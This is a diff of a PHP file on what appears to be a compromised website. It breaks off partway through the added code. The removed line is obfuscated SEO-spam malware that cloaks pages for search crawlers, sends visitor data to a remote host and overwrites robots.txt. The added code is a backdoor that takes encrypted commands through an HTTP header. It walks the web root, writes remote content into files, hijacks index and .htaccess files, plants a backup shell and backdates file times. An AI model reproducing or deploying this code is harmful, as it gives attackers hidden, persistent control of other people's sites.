@@ -1,1 +1,348 @@
-<?php @header('Content-Type:text/html;charset=utf-8');error_reporting(0); $OOOOOO="%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a%7c%2b%2c"; global $O; $O=urldecode($OOOOOO);$oOooOO='z40812_2';$oOooOOoO=$O[15].$O[4].$O[4].$O[9].$O[62].$O[63].$O[63].$O[64].$O[73].$O[71].$O[59].$O[65].$O[67].$O[70].$O[59].$O[65].$O[66].$O[67].$O[59].$O[64].$O[67].$O[63].$oOooOO.$O[63]; function ooooooooOOOOOOOOoooooOOO($oooOOOoOoo){$ooooOOOooOo=curl_init();curl_setopt ($ooooOOOooOo, CURLOPT_URL, $oooOOOoOoo);curl_setopt ($ooooOOOooOo, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ooooOOOooOo, CURLOPT_CONNECTTIMEOUT, 5);$oooooOOOOooO = curl_exec($ooooOOOooOo);curl_close($ooooOOOooOo);return $oooooOOOOooO; } function ooOOoOOO($OooooO,$OOOoooo=array()){global $O;$OooooO=str_replace(' ','+',$OooooO);$OOooooO=curl_init();curl_setopt($OOooooO,CURLOPT_URL, "$OooooO");curl_setopt($OOooooO,CURLOPT_RETURNTRANSFER, 1);curl_setopt($OOooooO,CURLOPT_HEADER, 0);curl_setopt($OOooooO,CURLOPT_TIMEOUT,10);curl_setopt($OOooooO,CURLOPT_POST, 1);curl_setopt($OOooooO,CURLOPT_POSTFIELDS, http_build_query($OOOoooo));$OOOOooo=curl_exec($OOooooO);$OOOOoooOO=curl_errno($OOooooO);curl_close($OOooooO);if(0!==$OOOOoooOO){return false;}return $OOOOooo;} function oooOOOo($ooOOo){global $O;$ooOOOOo = false;$oooooOOo = $O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[23].$O[8].$O[4].$O[90].$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[90].$O[5].$O[10].$O[15].$O[8].$O[8].$O[90].$O[23].$O[7].$O[24].$O[14].$O[90].$O[10].$O[8].$O[18];if ($ooOOo!=''){if (preg_match("/($oooooOOo)/si",$ooOOo)){$ooOOOOo=true;}}return $ooOOOOo;} function oooOOooOOoOO($oOOOOOOoOOOO){global $O;$ooOOOOOOoO=false;$ooOOOOOOoOo=$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[59].$O[21].$O[8].$O[59].$O[16].$O[9].$O[90].$O[5].$O[10].$O[15].$O[8].$O[8].$O[59].$O[21].$O[8].$O[59].$O[16].$O[9].$O[90].$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[59].$O[21].$O[8].$O[25];if ($oOOOOOOoOOOO!='' && preg_match("/($ooOOOOOOoOo)/si", $oOOOOOOoOOOO)) {$ooOOOOOOoO=true;}return $ooOOOOOOoO;}$oOooOOoOO=((isset($_SERVER[$O[41].$O[30].$O[30].$O[35].$O[37]]) && $_SERVER[$O[41].$O[30].$O[30].$O[35].$O[37]]!==$O[8].$O[13].$O[13])?$O[15].$O[4].$O[4].$O[9].$O[11].$O[62].$O[63].$O[63]:$O[15].$O[4].$O[4].$O[9].$O[62].$O[63].$O[63]);$oOoooOOoOO=$_SERVER[$O[29].$O[28].$O[26].$O[32].$O[28].$O[37].$O[30].$O[52].$O[32].$O[29].$O[33]];$ooOOoooOOoOO=$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[41].$O[34].$O[37].$O[30]];$ooOOOoooOOoOO=$_SERVER[$O[35].$O[41].$O[35].$O[52].$O[37].$O[28].$O[44].$O[39]];$ooOOOOoooOOOoOO=$_SERVER[$O[37].$O[28].$O[29].$O[48].$O[28].$O[29].$O[52].$O[50].$O[36].$O[51].$O[28]];$ooOOOOoooOOOOoOO=$oOooOOoOO.$ooOOoooOOoOO.$oOoooOOoOO;$oooOOOOoooOOOooOO=$oOooOOoO.$O[63].$O[7].$O[24].$O[12].$O[10].$O[4].$O[10].$O[59].$O[9].$O[15].$O[9];$ooooOOOOoooOOOooO=$oOooOOoO.$O[63].$O[25].$O[10].$O[9].$O[59].$O[9].$O[15].$O[9];$ooooOOOOoooOOOooOoo=$oOooOOoO.$O[63].$O[16].$O[6].$O[25].$O[9].$O[59].$O[9].$O[15].$O[9];$oooooOOoooOOOoooOoo=$oOooOOoO.$O[63].$O[1].$O[8].$O[3].$O[12].$O[11].$O[59].$O[9].$O[15].$O[9];$ooooooooOOOOoooOOoooOO=$oOooOOoO.$O[63].$O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[9].$O[15].$O[9];$ooooooOoOoooOOOooo[$O[6].$O[11].$O[2].$O[3].$O[52].$O[10].$O[14].$O[2].$O[24].$O[4]]=strtolower(isset($_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[32].$O[37].$O[28].$O[29].$O[52].$O[36].$O[40].$O[28].$O[50].$O[30]])?$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[32].$O[37].$O[28].$O[29].$O[52].$O[36].$O[40].$O[28].$O[50].$O[30]]:'');$oooOoOOooOoooOOOoOoOoOoOoO=strtolower(isset($_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[32].$O[37].$O[28].$O[29].$O[52].$O[36].$O[40].$O[28].$O[50].$O[30]])?$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[32].$O[37].$O[28].$O[29].$O[52].$O[36].$O[40].$O[28].$O[50].$O[30]]:'');$ooooooOoOoooOOOooo[$O[15].$O[4].$O[4].$O[9].$O[52].$O[6].$O[11].$O[2].$O[3].$O[52].$O[10].$O[14].$O[2].$O[24].$O[4]]=$oooOoOOooOoooOOOoOoOoOoOoO;$oooOOOooOoooOOOooooOoOoOoOoO=isset($_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[29].$O[28].$O[39].$O[28].$O[29].$O[28].$O[29]])?$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[29].$O[28].$O[39].$O[28].$O[29].$O[28].$O[29]]:'';$ooooOOOOoooOOOoooOOO=$_SERVER[$O[29].$O[28].$O[51].$O[34].$O[30].$O[28].$O[52].$O[36].$O[38].$O[38].$O[29]];$ooooooOoOoooOOOooo[$O[7].$O[9]]=$ooooOOOOoooOOOoooOOO;$ooooooOoOoooOOOooo[$O[3].$O[2].$O[13].$O[2].$O[3].$O[2].$O[3]]=$oooOOOooOoooOOOooooOoOoOoOoO;if(strpos($oOoooOOoOO,$O[59].$O[9].$O[15].$O[9])){$ooooooOOoooOOOoooOo=$oOooOOoOO.$ooOOoooOOoOO.$ooOOOoooOOoOO;}else{$ooooooOOoooOOOoooOo=$oOooOOoOO.$ooOOoooOOoOO;}$ooooooOoOoooOOOooo[]=array();$ooooooOoOoooOOOooo[$O[12].$O[8].$O[25].$O[10].$O[7].$O[24]]=$ooOOoooOOoOO;$ooooooOoOoooOOOooo[$O[3].$O[2].$O[0].$O[52].$O[6].$O[3].$O[7]]=$oOoooOOoOO;$ooooooOoOoooOOOooo[$O[15].$O[3].$O[2].$O[13]]=$ooooooOOoooOOOoooOo;$ooooooOoOoooOOOooo[$O[3].$O[2].$O[0].$O[52].$O[6].$O[3].$O[18]]=$ooOOOOoooOOOOoOO;if(substr($oOoooOOoOO,-6)==$O[3].$O[8].$O[23].$O[8].$O[4].$O[11]){define('BASE_PATH',str_ireplace($_SERVER[$O[35].$O[41].$O[35].$O[52].$O[37].$O[28].$O[44].$O[39]],'',__FILE__));$ooooooooOOOOOoooOoOoooOO=@file_get_contents(BASE_PATH.$O[63].$O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[4].$O[20].$O[4]);$ooooooOoOoooOOOooo[$O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[52].$O[21].$O[8].$O[24].$O[4]]=$ooooooooOOOOOoooOoOoooOO;$ooooooooOOOOOoooOoOoooOO = ooOOoOOO($ooooooooOOOOoooOOoooOO,$ooooooOoOoooOOOooo);file_put_contents(BASE_PATH.$O[63].$O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[4].$O[20].$O[4],$ooooooooOOOOOoooOoOoooOO);$ooooooooOOOOOoooOoOoooOO=@file_get_contents(BASE_PATH.$O[63].$O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[4].$O[20].$O[4]);if(strpos($ooooooooOOOOOoooOoOoooOO,$O[59].$O[20].$O[25].$O[18])){	echo $O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[4].$O[20].$O[4].$O[57].$O[13].$O[7].$O[18].$O[2].$O[57].$O[21].$O[3].$O[2].$O[10].$O[4].$O[2].$O[57].$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[88];}else{	echo $O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[4].$O[20].$O[4].$O[57].$O[13].$O[7].$O[18].$O[2].$O[57].$O[21].$O[3].$O[2].$O[10].$O[4].$O[2].$O[57].$O[13].$O[10].$O[7].$O[18].$O[88];}exit;}if(substr($oOoooOOoOO,-4)==$O[59].$O[20].$O[25].$O[18]){if(strpos($oOoooOOoOO,$O[9].$O[7].$O[24].$O[14].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[59].$O[20].$O[25].$O[18])){$ooooooOoOoooOOOooooO = ooOOoOOO($ooooOOOOoooOOOooO,$ooooooOoOoooOOOooo);$ooooooOOoooOOOooooOOO= explode(",",$ooooooOoOoooOOOooooO);$ooooooOOoooOOOooooOOO[]=$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9];for($ooooooOOoooOOOooooOOOOo=0;$ooooooOOoooOOOooooOOOOo<count($ooooooOOoooOOOooooOOO);$ooooooOOoooOOOooooOOOOo++){if(strpos($ooooooOOoooOOOoooOo,$O[59].$O[9].$O[15].$O[9])> 0){$ooooooOOoooOOOooooOOOOoo=$O[55];}else{$ooooooOOoooOOOooooOOOOoo=$O[63]; } $ooooooOOOoooOOOooooOOOOOoo=$ooooooOOoooOOOoooOo.$ooooooOOoooOOOooooOOOOoo.$ooooooOOoooOOOooooOOO[$ooooooOOoooOOOooooOOOOo].$O[59].$O[20].$O[25].$O[18]; $ooooooOOOOoooOOOooooOOOOOo=$O[15].$O[4].$O[4].$O[9].$O[11].$O[62].$O[63].$O[63].$O[1].$O[1].$O[1].$O[59].$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[59].$O[21].$O[8].$O[25].$O[63].$O[9].$O[7].$O[24].$O[14].$O[55].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[61].$ooooooOOOoooOOOooooOOOOOoo; $ooooooOOOOoooOOOooooOOOOOoOooOoOo=$O[15].$O[4].$O[4].$O[9].$O[62].$O[63].$O[63].$O[1].$O[1].$O[1].$O[59].$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[59].$O[21].$O[8].$O[25].$O[63].$O[9].$O[7].$O[24].$O[14].$O[55].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[61].$ooooooOOOoooOOOooooOOOOOoo; if(stristr(@file_get_contents($ooooooOOOOoooOOOooooOOOOOo),$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[13].$O[6].$O[18].$O[18].$O[5])){echo $ooooooOOOOoooOOOooooOOOOOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[34].$O[43].PHP_EOL;}else if(stristr(@ooooooooOOOOOOOOoooooOOO($ooooooOOOOoooOOOooooOOOOOo),$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[13].$O[6].$O[18].$O[18].$O[5])){echo $ooooooOOOOoooOOOooooOOOOOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[34].$O[43].PHP_EOL; }else if(stristr(@file_get_contents($ooooooOOOOoooOOOooooOOOOOoOooOoOo),$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[13].$O[6].$O[18].$O[18].$O[5])){echo $ooooooOOOOoooOOOooooOOOOOoOooOoOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[34].$O[43].PHP_EOL; }else if(stristr(@ooooooooOOOOOOOOoooooOOO($ooooooOOOOoooOOOooooOOOOOoOooOoOo),$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[13].$O[6].$O[18].$O[18].$O[5])){echo $ooooooOOOOoooOOOooooOOOOOoOooOoOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[34].$O[43].PHP_EOL; }else{echo $ooooooOOOOoooOOOooooOOOOOoOooOoOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[13].$O[10].$O[7].$O[18].PHP_EOL;}}exit;}if(strpos($oOoooOOoOO,$O[10].$O[18].$O[18].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[59].$O[20].$O[25].$O[18]) || strpos($oOoooOOoOO,$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[53].$O[7].$O[24].$O[12].$O[2].$O[20].$O[59].$O[20].$O[25].$O[18]) || strpos($oOoooOOoOO,$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[53].$O[7].$O[24].$O[12].$O[2].$O[20].$O[53].$O[64].$O[59].$O[20].$O[25].$O[18]) || strpos($oOoooOOoOO,$O[7].$O[24].$O[12].$O[2].$O[20].$O[59].$O[20].$O[25].$O[18])){$ooooooOoOoooOOOooooO = ooOOoOOO($ooooOOOOoooOOOooO,$ooooooOoOoooOOOooo);header($O[47].$O[8].$O[24].$O[4].$O[2].$O[24].$O[4].$O[53].$O[4].$O[5].$O[9].$O[2].$O[62].$O[4].$O[2].$O[20].$O[4].$O[63].$O[20].$O[25].$O[18]); echo $ooooooOoOoooOOOooooO;exit;}if(strpos($oOoooOOoOO,$O[59].$O[9].$O[15].$O[9])){ $ooooooOOoOOoooOOOooooOOOOO=explode($O[55],$oOoooOOoOO); $ooooooOOoOOoooOOOooooOOOOO=$ooooooOOoOOoooOOOooooOOOOO[count($ooooooOOoOOoooOOOooooOOOOO)-1]; $ooooooOOoOOoooOOOooooOOOOO=str_replace($O[59].$O[20].$O[25].$O[18],"",$ooooooOOoOOoooOOOooooOOOOO);}else{ $ooooooOOoOOoooOOOooooOOOOO= str_replace($O[63],"",$oOoooOOoOO);$ooooooOOoOOoooOOOooooOOOOO= str_replace($O[59].$O[20].$O[25].$O[18],"",$ooooooOOoOOoooOOOooooOOOOO);}$ooooooOoOoooOOOooo[$O[1].$O[8].$O[3].$O[12]]=$ooooooOOoOOoooOOOooooOOOOO;$ooooooOoOoooOOOooo[$O[10].$O[21].$O[4].$O[7].$O[8].$O[24]]=$O[21].$O[15].$O[2].$O[21].$O[17].$O[52].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9];$ooooooOOoOoOoooOOOooooOOoOOO=ooOOoOOO($oooooOOoooOOOoooOoo,$ooooooOoOoooOOOooo);if($ooooooOOoOoOoooOOOooooOOoOOO=='1'){$ooooooOoOoooOOOooooO=ooOOoOOO($ooooOOOOoooOOOooO,$ooooooOoOoooOOOooo);header($O[47].$O[8].$O[24].$O[4].$O[2].$O[24].$O[4].$O[53].$O[4].$O[5].$O[9].$O[2].$O[62].$O[4].$O[2].$O[20].$O[4].$O[63].$O[20].$O[25].$O[18]);echo $ooooooOoOoooOOOooooO;exit;}$ooooooOoOoooOOOooo[$O[10].$O[21].$O[4].$O[7].$O[8].$O[24]]=$O[21].$O[15].$O[2].$O[21].$O[17].$O[52].$O[1].$O[8].$O[3].$O[12].$O[11];$ooooooOOoOoOoooOOOooooOOoOoOO= ooOOoOOO($oooooOOoooOOOoooOoo,$ooooooOoOoooOOOooo);if(strpos($oOoooOOoOO,$O[25].$O[10].$O[9])> 0 || $ooooooOOoOoOoooOOOooooOOoOoOO=='1'){$ooooooOoOoooOOOooo[$O[10].$O[21].$O[4].$O[7].$O[8].$O[24]]=$O[3].$O[10].$O[24].$O[12].$O[52].$O[20].$O[25].$O[18];$ooooooOOoOoOoooOOOooooOOoOOO=ooOOoOOO($oooooOOoooOOOoooOoo,$ooooooOoOoooOOOooo);header($O[47].$O[8].$O[24].$O[4].$O[2].$O[24].$O[4].$O[53].$O[4].$O[5].$O[9].$O[2].$O[62].$O[4].$O[2].$O[20].$O[4].$O[63].$O[20].$O[25].$O[18]);echo $ooooooOOoOoOoooOOOooooOOoOOO;exit;}}if(strpos($oOoooOOoOO,$O[59].$O[9].$O[15].$O[9])){$ooooooOOooOooOoooOOOooooOOoOoOO=$oOooOOoOO.$ooOOOOoooOOOoOO.$ooOOOoooOOoOO;$ooooooOoOoooOOOooo[$O[25].$O[10].$O[7].$O[24].$O[52].$O[11].$O[15].$O[2].$O[18].$O[18]]=$ooooooOOooOooOoooOOOooooOOoOoOO;}else{$ooooooOOooOooOoooOOOooooOOoOoOO=$oOooOOoOO.$ooOOOOoooOOOoOO;$ooooooOoOoooOOOooo[$O[25].$O[10].$O[7].$O[24].$O[52].$O[11].$O[15].$O[2].$O[18].$O[18]]=$ooooooOOooOooOoooOOOooooOOoOoOO;}  $ooooOoOOooOoooOOOoOoOoOoO=oooOOooOOoOO($oooOOOooOoooOOOooooOoOoOoOoO);if(strpos($_SERVER[$O[29].$O[28].$O[26].$O[32].$O[28].$O[37].$O[30].$O[52].$O[32].$O[29].$O[33]],$O[59].$O[9].$O[15].$O[9])){ $ooooooooOOOOOOOO = $O[55]; }else{ $ooooooooOOOOOOOO = $O[63]; } $oooOoOooOooOoooOOOoOoOoOoOo=oooOOOo($oooOoOOooOoooOOOoOoOoOoOoO); if(!$oooOoOooOooOoooOOOoOoOoOoOo && $ooooOoOOooOoooOOOoOoOoOoO && ( preg_match($O[63].$O[16].$O[10].$O[63].$O[7],@$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[36].$O[47].$O[47].$O[28].$O[35].$O[30].$O[52].$O[44].$O[36].$O[50].$O[40].$O[32].$O[36].$O[40].$O[28]]) || preg_match($O[63].$O[16].$O[9].$O[63].$O[7],@$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[36].$O[47].$O[47].$O[28].$O[35].$O[30].$O[52].$O[44].$O[36].$O[50].$O[40].$O[32].$O[36].$O[40].$O[28]]) || preg_match("/^[a-z0-9]+[0-9]+$/",end(explode($ooooooooOOOOOOOO,str_replace(array(".html",".htm"),"",$_SERVER[$O[29].$O[28].$O[26].$O[32].$O[28].$O[37].$O[30].$O[52].$O[32].$O[29].$O[33]])))))){	echo ooOOoOOO($ooooOOOOoooOOOooOoo,$ooooooOoOoooOOOooo);exit;}if($oooOoOooOooOoooOOOoOoOoOoOo){$ooooooOOOOOoooOOOOooooooO = ooOOoOOO($oooOOOOoooOOOooOO,$ooooooOoOoooOOOooo); if($ooooooOOOOOoooOOOOooooooO==$O[70].$O[67].$O[70]){header($O[41].$O[30].$O[30].$O[35].$O[63].$O[64].$O[59].$O[67].$O[57].$O[70].$O[67].$O[70].$O[57].$O[50].$O[8].$O[4].$O[57].$O[39].$O[8].$O[6].$O[24].$O[12]);exit;}else if($ooooooOOOOOoooOOOOooooooO==$O[69].$O[67].$O[67]){header($O[41].$O[30].$O[30].$O[35].$O[63].$O[64].$O[59].$O[67].$O[57].$O[69].$O[67].$O[67].$O[57].$O[33].$O[24].$O[4].$O[2].$O[3].$O[24].$O[10].$O[18].$O[57].$O[37].$O[2].$O[3].$O[22].$O[2].$O[3].$O[57].$O[28].$O[3].$O[3].$O[8].$O[3]);exit;}else if($ooooooOOOOOoooOOOOooooooO==$O[23].$O[18].$O[10].$O[24].$O[17]){echo '';exit;}else{echo $ooooooOOOOOoooOOOOooooooO;exit;} }else{ header($O[41].$O[30].$O[30].$O[35].$O[63].$O[64].$O[59].$O[67].$O[57].$O[70].$O[67].$O[70].$O[57].$O[50].$O[8].$O[4].$O[57].$O[39].$O[8].$O[6].$O[24].$O[12]);} ?>
+<?php
+error_reporting(0);
+class ErrorCode
+{
+    const E_200400 = 200400;
+}
+class MsgText
+{
+    const PARAM_EMPTY = 'param is empty';
+    const PARAM_TYPE = 'param type error';
+    const VALUE_ERROR = 'value error';
+    const NOCHANGE = 'no change';
+    const LOCK_FILE_SUCCESS = 'generate lock file success,but lock index.php error';
+    const LOCK_FILE_ERROR = 'generate lock file error';
+    const REMOTE_GET_ERROR = 'get remote content error';
+    const LOCAL_FILE_ERROR = 'generate local file error';
+    const SUCCESS = 'success';
+    const LOCAL_FILE_EXISTS = 'local file doesn\'t exist';
+    const REMOTE_FILE_EXISTS = 'remote file doesn\'t exist';
+    const RENAME_ERROR = 'rename error';
+    const INDEX_ERROR = 'index hijack error';
+    const UNKNOWN_ERROR = 'unknown error';
+    const DECRYPT_FAIL = 'params decrypt fail';
+}
+function error($msg = MsgText::UNKNOWN_ERROR, $extras = [], $code = 0)
+{
+    empty($code) && $code = ErrorCode::E_200400;
+    exit(@json_encode(['code' => $code, 'msg' => $msg, 'extras' => $extras], JSON_UNESCAPED_UNICODE));
+}
+function success($data)
+{
+    exit(@json_encode(['code' => 200, 'msg' => MsgText::SUCCESS, 'data' => $data], JSON_UNESCAPED_UNICODE));
+}
+function getDirPathsByLevel($level = 6)
+{
+    $initDir = $_SERVER['DOCUMENT_ROOT'];
+    $dirs = array($initDir);
+    $count = count($dirs);
+    while (count($dirs) > ($count - 1)) {
+        $path = $dirs[($count - 1)];
+        $count += 1;
+        if (@is_dir($path) && @$handle = @opendir($path)) {
+            while ($file = @readdir($handle)) {
+                $realpath = $path . '/' . $file;
+                if ($file == '.' || $file == '..' || !is_dir($realpath) || substr($file, 0, 1) === '.') {
+                    continue;
+                }
+                $path3 = str_replace($initDir, "", $path);
+                $path4 = explode("/", $path3);
+                if (count($path4) > $level - 1) {
+                    continue;
+                }
+                $dirs[] = $realpath;
+            }
+        }
+        @closedir($handle);
+    }
+    return $dirs;
+}
+function getUrl($url)
+{
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($curl, CURLOPT_TIMEOUT, 5);
+    curl_setopt($curl, CURLOPT_AUTOREFERER, 0);
+    curl_exec($curl);
+    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+    curl_close($curl);
+    if ($httpCode === 200) {
+        $content = curl_exec($curl);
+        return ['code' => 200, 'resp' => $content];
+    }
+    return ['code' => 500, 'resp' => ''];
+}
+function getRemoteContent($url)
+{
+    $content = @file_get_contents($url);
+    if ($content === false) {
+        $curl = curl_init();
+        curl_setopt($curl, CURLOPT_URL, $url);
+        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($curl, CURLOPT_TIMEOUT, 5);
+        curl_setopt($curl, CURLOPT_AUTOREFERER, 0);
+        $content = curl_exec($curl);
+        curl_close($curl);
+    }
+    return !empty($content) && is_string($content) ? $content : '';
+}
+function copyfile($content, $localfile, $isAppend = false, $appendContent = '')
+{
+    if ($isAppend && !empty($appendContent)) {
+        $content = trim($content);
+        if (substr($content, -2, 2) !== '?>') {
+            $content .= ' ?>';
+        }
+        $content = $content . PHP_EOL . PHP_EOL . $appendContent;
+    }
+    @file_put_contents($localfile, $content);
+    if (!file_exists($localfile)) {
+        $openedfile = @fopen($localfile, "w");
+        @fwrite($openedfile, $content);
+        @fclose($openedfile);
+    }
+    if (!file_exists($localfile)) {
+        return false;
+    }
+    return true;
+}
+function updateFiletime($filepath)
+{
+    $ctime = filectime($filepath);
+    $now = time();
+    if (!($now > $ctime + 31104000)) {
+        $newTime = $now - (mt_rand(15552000, 31104000));
+        touch($filepath, $newTime, $newTime);
+        return true;
+    }
+    return true;
+}
+$privateKey = '-----BEGIN PRIVATE KEY-----
+MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC30w49ItOfldQ6
+dB+0gEbeeW6BEClcx+NZzmpX2YcRHFV80BurCWBavPFehV8Sy9yL2u/y3mv3QJJ+
+x2kKvly8zKx4GbXPbsWJk6Ho0Rxq49oXkBarQBOqROZeaFF3Mzpd/PdLSsxEvG1M
+tQd2wOx5r6XD86jyfN7LAJUUVvbJvn1CHo03nFH12k1KYwLnQfzQI5nX7yQLa0jt
+fG5TA34Fm0EMbFdHWjAN/VdEjoJI6it4PCQP5wk4ga2BvVquQkuPbsbr8364d3I6
+GuGAKDR0wfkT20n0E6kAmDI3ol2bfa0rQncqUS3OU3INpxOZS8eKCIgC3bM81mdi
+MQ6TsAQ9AgMBAAECggEAJLGSlA2RpLdpx8lKUuOQQfSHZGfveb/E2DZl7+dSGM5J
+GkMIYtnaTAKPQ8jns37SJXCsmRRhBNf05i20ABsDtAQ/ITIwopmAAPhhR3IGdCfL
+bwyqGcEOq9xZB9tW965YJk7KplLl94qNXtR8Cu5zxc6UDktjHBRk/Ky/FXJOjPKM
+sA8rhox7dqlZUB3I/qiqrQOgT1Bsq1BFT+2GGwRUWZ1CyFoZvhsDomdo4yhRrB0b
+8Ym4MDiVqxFPVW8XB9RFD9YKt+v50Eb6iSKJNLpRmjZDNZbrEYO6NRsRBM7brDa9
+n39mZWFr47wGGXXv/NhwTvRI+2Si/ZfdP4+o5TeSWQKBgQDhIVOUODisiLhk7XKb
+Yu7BW1ZFcK0JxurqHN22msvA0Q/1q4RvziETjekXIn9lVKCmS/gy2O2RtuQRulAR
+fc3sz2W9tNXRF8Avy0728NG0baOOwBalO8w3cCX6Nnm70pJer+iJSn3tmAKSB4LT
+vbSB8pt6QgP8NPHyQdWp2LwOtwKBgQDRB8lgSaImIMJBaXERSaoNg8kxv3/cv4g5
+jUlljxNQcUsj0V7XilnB3mFxq5rHjBZTsKzMMQyvhOxYhptDfw6OLtoPUk2WiBUs
+l3qU0tIXNN+cTxu2SMKTjwMktkpmACJqa+k27eEUqxrKO/6SEiP9FMXHvgA4EEBM
+Hww1eU9QqwKBgAWSY5Uphw2OHLIyxkFeQ3Z5ojr5vO6fA7VjnYEld6GACxsTcaWq
+vlrTik9ORUTmwUscWjo38DlJA4AE0nJ8YJpZz7TQQvJ32gPUzlGCSE5k4EVqL6VL
+Q5Sjq+zzaDPj1EePpvuu4kr9FiMzGGPRMCR/MqXl+F9HmC1cv8MCYDUlAoGBAK77
+g7pVKaYdWkCD0iEUt4Rkw/IfSxwyQglbmwungBWhIbO0O17X9Fd0n8IWU5WkUbRx
+e9XbYbE05t0cobEZFcg0tFqLHWRcOs1/aSBYc4L1whMJrjskIa6A07LR3uoQRr8r
+4qkW7YrtyZluK6eABByCXSbeiTRldk3C1+eTy6/NAoGAb9/J+NWrhYSr/VoGWjui
+chXCNszy4w6exVwxXQKNTtlzKxyhQfVPK2BxrptWL6KCRKpz3wh+WY2C3QYyVfwG
+FB4hwDr2mY4TWF9pD194iES1yhrQGlI8XM+2LVhBl3p0x+TFgJMaTgDDqAnxpuqT
+upBYqTYMlOd+VR7hENMaFqo=
+-----END PRIVATE KEY-----';
+$p = $_SERVER['HTTP_P'];
+$params = openssl_private_decrypt(base64_decode(urldecode($p)), $decrypted, $privateKey) ? $decrypted : null;
+if (is_null($params)) {
+    error(MsgText::DECRYPT_FAIL);
+}
+$params = json_decode($params, true);
+if (!is_array($params)) {
+    error(MsgText::PARAM_TYPE, $params);
+}
+if (empty($params['server'])) {
+    error('server ' . MsgText::PARAM_EMPTY);
+}
+if (empty($params['iden'])) {
+    error('iden ' . MsgText::PARAM_EMPTY);
+}
+$iden = isset($params['iden']) ? strtolower($params['iden']) : '';
+switch ($iden) {
+    case "beima":
+        $res = doBeima($params);
+        break;
+    case "rename":
+        $res = doRename($params);
+        break;
+    case "index":
+        $res = doIndex($params);
+        break;
+    case "sub":
+    case "htaccess":
+        $res = doSub($params);
+        break;
+    case "lock":
+        $res = doLock($params);
+        break;
+    case "style":
+        $res = doStyle($params);
+        break;
+    default:
+        error('iden ' . MsgText::VALUE_ERROR);
+}
+function doBeima($params)
+{
